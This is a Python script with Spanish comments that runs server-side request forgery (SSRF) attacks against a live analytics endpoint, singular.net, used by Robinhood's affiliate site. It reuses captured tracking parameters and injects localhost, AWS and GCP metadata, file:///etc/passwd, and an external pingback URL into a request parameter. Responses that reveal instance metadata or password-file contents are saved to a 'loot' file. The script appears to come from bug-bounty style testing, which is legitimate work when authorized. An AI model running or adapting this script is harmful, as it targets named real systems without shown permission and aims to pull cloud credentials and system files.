import requests
import time
import urllib.parse
from colorama import init, Fore, Style

init(autoreset=True)

# La URL base detectada por BugBot
BASE_URL = "https://sdk-api-v1.singular.net/api/v1/event"

# Todos los parámetros originales capturados
ORIGINAL_PARAMS = {
    "current_device_time": "1772551551",
    "event_id": "2271ff92-015d-4dcc-98c6-50abb04a06b8",
    "conversion_event": "true",
    "k": "SDID",
    "a": "robinhood_acd79726",
    "p": "Web",
    "i": "com.robinhood.web",
    "screen_height": "720",
    "screen_width": "1280",
    "sdk": "WebSDK-v1.4.9",
    "singular_instance_id": "d2459ec8-c27d-48e3-a81a-95ae24aa0c25",
    "sdid": "1efce4eb-8c47-4301-8f16-f83c406e7d03",
    "storage_type": "local",
    "timezone": "GMT+0100",
    "touchpoint_timestamp": "1772551551",
    "n": "__PAGE_VISIT__",
    "is_revenue_event": "false",
    "first": "true",
    "is_after_conversion_event": "false",
    "s": "320c83c3-c7ad-4baf-925c-8b3938002ce8",
    "web_page_url": "https://affiliates.robinhood.com/",
    "is_first_visit": "true",
    "is_page_refreshed": "false",
    "sdid_persist_mode": "auto",
    "is_first_page_visit_in_session": "true",
    "ecid": "1efce4eb-8c47-4301-8f16-f83c406e7d03",
    "os": "Windows",
    "lag": "0",
    "h": "732c70f89301efca4047f0de5a66bc017fb6ee65"
}

# Payloads a inyectar en el parámetro 'u' (URL)
PAYLOADS = [
    ("Localhost HTTP", "http://127.0.0.1"),
    ("Localhost HTTPS", "https://127.0.0.1"),
    ("Localhost Port 22", "http://127.0.0.1:22"), # SSH Port
    ("Localhost Port 80", "http://127.0.0.1:80"),
    ("Localhost Port 8080", "http://127.0.0.1:8080"),
    ("AWS Meta-Data", "http://169.254.169.254/latest/meta-data/"),
    ("GCP Meta-Data", "http://metadata.google.internal/computeMetadata/v1/"),
    ("File Protocol", "file:///etc/passwd"),
    ("External Pingback", "http://ping.requestcatcher.com/bugbot_ssrf") # Cambiar si es posible
]

def test_ssrf():
    print(f"{Fore.CYAN}[*] Iniciando Pruebas de SSRF en: {BASE_URL}")
    print(f"{Fore.CYAN}[*] Objetivo: singular.net (Dominio de Terceros de Robinhood)\n")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36",
        "Origin": "https://affiliates.robinhood.com",
        "Referer": "https://affiliates.robinhood.com/",
        "Accept": "*/*"
    }

    for name, payload in PAYLOADS:
        print(f"{Fore.YELLOW}[>] Probando Payload: {name} -> {payload}")
        params = ORIGINAL_PARAMS.copy()
        params['u'] = payload
        
        try:
            start_time = time.time()
            response = requests.get(BASE_URL, params=params, headers=headers, timeout=10)
            elapsed = time.time() - start_time
            
            # Construimos la URL completa inyectada para mostrarla
            url_str = f"{BASE_URL}?{urllib.parse.urlencode(params)}"
            
            print(f"    {Fore.GREEN}[+] Código: {response.status_code}")
            print(f"    {Fore.WHITE}[+] Tiempo: {elapsed:.2f}s")
            print(f"    {Fore.WHITE}[+] Longitud: {len(response.text)} bytes")
            print(f"    {Fore.WHITE}[+] Fragmento Response: {response.text[:200]}")
            
            if response.status_code == requests.codes.ok:
                print(f"    {Fore.RED}[!] ¡ALERTA! El servidor respondió 200 OK. Posible inyección cegada o explotación exitosa.")
                # Guardamos la respuesta si parece interesante
                if "ami-id" in response.text or "root:x:" in response.text:
                   print(f"    {Fore.RED}[!!!] SECRETOS ENCONTRADOS en el body.")
                   with open("ssrf_loot.txt", "a") as f:
                       f.write(f"\n--- Payoad: {payload} ---\n{response.text}\n")
                       
        except requests.exceptions.RequestException as e:
            print(f"    {Fore.RED}[-] Error (Posible bloqueo/Timeout): {e}")
            
        print("-" * 50)
        time.sleep(1) # Rate limit suave para no quemar el servidor

if __name__ == "__main__":
    test_ssrf()
